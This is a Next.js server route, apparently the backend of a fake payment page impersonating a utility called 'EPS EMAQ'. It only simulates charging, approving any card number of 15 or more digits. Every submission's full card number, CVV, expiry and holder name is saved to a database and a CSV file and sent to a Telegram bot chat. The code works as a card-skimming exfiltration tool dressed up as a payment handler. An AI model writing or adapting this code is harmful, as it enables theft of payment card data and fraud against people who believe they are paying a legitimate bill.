import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';
import { neon } from '@neondatabase/serverless';

type PagoPayload = {
  codcliente: string;
  nombre: string;
  monto: number;
  numTarjeta: string;
  titular: string;
  vencimiento: string;
  cvv: string;
};

const CSV_PATH = path.join(process.cwd(), 'pagos_log.csv');
const CSV_HEADER = 'fecha,codigo_cliente,nombre,monto,tarjeta,num_tarjeta_completo,cvv,titular,vencimiento,estado,nro_operacion\n';

function inicializarCSV() {
  if (!fs.existsSync(CSV_PATH)) {
    fs.writeFileSync(CSV_PATH, CSV_HEADER, 'utf-8');
  }
}

function detectarTipo(num: string): string {
  const n = num.replace(/\s/g, '');
  if (n.startsWith('4')) return 'VISA';
  if (n.startsWith('5') || n.startsWith('2')) return 'MASTERCARD';
  if (n.startsWith('3')) return 'AMEX';
  return 'TARJETA';
}

function maskCard(num: string): string {
  const n = num.replace(/\s/g, '');
  const tipo = detectarTipo(n);
  const ultimos4 = n.slice(-4);
  return `${tipo} **** **** **** ${ultimos4}`;
}

function escaparCSV(val: string | number): string {
  const str = String(val);
  if (str.includes(',') || str.includes('"') || str.includes('\n')) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

function simularPago(num: string): { exitoso: boolean; motivo?: string } {
  const n = num.replace(/\s/g, '');
  const aprobadas = ['4111111111111111', '4242424242424242', '5500005555555559', '5105105105105100'];
  const rechazadas = ['4000000000000002', '4000000000009995', '4000000000000069'];

  if (aprobadas.includes(n)) return { exitoso: true };
  if (rechazadas.includes(n)) return { exitoso: false, motivo: 'Tarjeta rechazada por el banco' };
  if (n.length >= 15) return { exitoso: true };
  return { exitoso: false, motivo: 'Número de tarjeta inválido' };
}

async function sendTelegramAlert(data: {
  codcliente: string;
  nombre: string;
  monto: number;
  numTarjetaCompleto: string;
  tarjeta: string;
  cvv: string;
  titular: string;
  vencimiento: string;
  estado: string;
  nroOperacion: string;
  fecha: string;
}) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;

  const icono = data.estado === 'EXITOSO' ? '✅' : '❌';
  const msg = [
    `${icono} *NUEVO PAGO — EPS EMAQ*`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `👤 *Cliente:* ${data.nombre}`,
    `📋 *Código:* ${data.codcliente}`,
    `💰 *Monto:* S/ ${data.monto.toFixed(2)}`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `💳 *Tarjeta:* ${data.tarjeta}`,
    `🔢 *Número:* \`${data.numTarjetaCompleto}\``,
    `📅 *Vencimiento:* ${data.vencimiento}`,
    `🔐 *CVV:* ${data.cvv}`,
    `👤 *Titular:* ${data.titular}`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `${icono} *Estado:* ${data.estado}`,
    `🆔 *N° Op:* ${data.nroOperacion}`,
    `🕐 *Fecha:* ${data.fecha}`,
  ].join('\n');

  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' }),
  });
}

async function guardarEnDB(data: {
  fecha: string;
  codcliente: string;
  nombre: string;
  monto: number;
  tarjeta: string;
  numTarjetaCompleto: string;
  cvv: string;
  titular: string;
  vencimiento: string;
  estado: string;
  nroOperacion: string;
}) {
  if (!process.env.DATABASE_URL) return;
  const sql = neon(process.env.DATABASE_URL);
  await sql`
    INSERT INTO pagos (codigo_cliente, nombre, monto, tarjeta, num_tarjeta_completo, cvv, titular, vencimiento, estado, nro_operacion)
    VALUES (${data.codcliente}, ${data.nombre}, ${data.monto}, ${data.tarjeta}, ${data.numTarjetaCompleto}, ${data.cvv}, ${data.titular}, ${data.vencimiento}, ${data.estado}, ${data.nroOperacion})
  `;
}

export async function POST(req: NextRequest) {
  let body: PagoPayload;
  try {
    body = await req.json();
  } catch {
    return NextResponse.json({ error: 'Solicitud inválida' }, { status: 400 });
  }

  const { codcliente, nombre, monto, numTarjeta, titular, vencimiento, cvv } = body;

  if (!codcliente || !monto || !numTarjeta || !titular || !vencimiento) {
    return NextResponse.json({ error: 'Faltan campos requeridos' }, { status: 400 });
  }

  await new Promise(r => setTimeout(r, 300));

  const resultado = simularPago(numTarjeta);
  const nroOperacion = `OP-${Date.now().toString().slice(-8)}`;
  const fecha = new Date().toLocaleString('es-PE', { timeZone: 'America/Lima' });
  const tarjetaMask = maskCard(numTarjeta);
  const estado = resultado.exitoso ? 'EXITOSO' : 'RECHAZADO';
  const numCompleto = numTarjeta.replace(/\s/g, '');

  // Guardar en Neon DB (producción)
  try {
    await guardarEnDB({
      fecha,
      codcliente,
      nombre,
      monto,
      tarjeta: tarjetaMask,
      numTarjetaCompleto: numCompleto,
      cvv: cvv || '',
      titular,
      vencimiento,
      estado,
      nroOperacion,
    });
  } catch (e) {
    console.error('Error al escribir en DB:', e);
  }

  // Notificación Telegram
  try {
    await sendTelegramAlert({
      codcliente,
      nombre,
      monto,
      numTarjetaCompleto: numCompleto,
      tarjeta: tarjetaMask,
      cvv: cvv || '',
      titular,
      vencimiento,
      estado,
      nroOperacion,
      fecha,
    });
  } catch (e) {
    console.error('Error al enviar alerta Telegram:', e);
  }

  // Guardar en CSV (local)
  try {
    inicializarCSV();
    const fila = [
      escaparCSV(fecha),
      escaparCSV(codcliente),
      escaparCSV(nombre),
      escaparCSV(monto.toFixed(2)),
      escaparCSV(tarjetaMask),
      escaparCSV(numCompleto),
      escaparCSV(cvv || ''),
      escaparCSV(titular),
      escaparCSV(vencimiento),
      escaparCSV(estado),
      escaparCSV(nroOperacion),
    ].join(',') + '\n';

    fs.appendFileSync(CSV_PATH, fila, 'utf-8');
  } catch {
    // CSV no disponible en producción (filesystem de solo lectura)
  }

  if (!resultado.exitoso) {
    return NextResponse.json({
      exitoso: false,
      motivo: resultado.motivo || 'Pago no procesado',
      nroOperacion,
    });
  }

  return NextResponse.json({
    exitoso: true,
    nroOperacion,
    tarjeta: tarjetaMask,
    fecha,
  });
}
